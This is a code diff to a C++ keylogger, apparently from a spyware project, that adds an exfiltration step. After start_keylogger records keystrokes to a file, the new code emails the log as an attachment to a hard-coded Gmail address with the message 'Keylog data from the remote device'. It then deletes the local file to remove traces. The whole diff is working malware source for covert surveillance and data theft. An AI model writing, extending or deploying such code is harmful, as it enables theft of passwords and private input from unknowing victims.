@@ -1,9 +1,9 @@
-#include <windows.h>
-#include <fstream>
 #include <chrono>
 #include <thread>
-#include <iostream>
 #include <map>
+#include <filesystem>
+#include "lib.h"
+#include "sendEmail.h"
 #include "keylogger.h"
 
 bool isShiftPressed() {
@@ -81,4 +81,17 @@ void start_keylogger(const std::string& filename, int durationSeconds) {
     }
 
     log.close();
+
+    ifstream test_file(filename);
+    if (test_file.good()) {
+        test_file.close();
+        send_email_with_attachment(
+            "serverbottestmmt@gmail.com", "Keylogger Log",
+            "Keylog data from the remote device.", filename);
+    } else {
+        cerr << "Failed to create keylog file" << endl;
+    }
+
+    if (!std::filesystem::remove(filename))
+        cerr << "Failed to delete the file." << endl;
 }
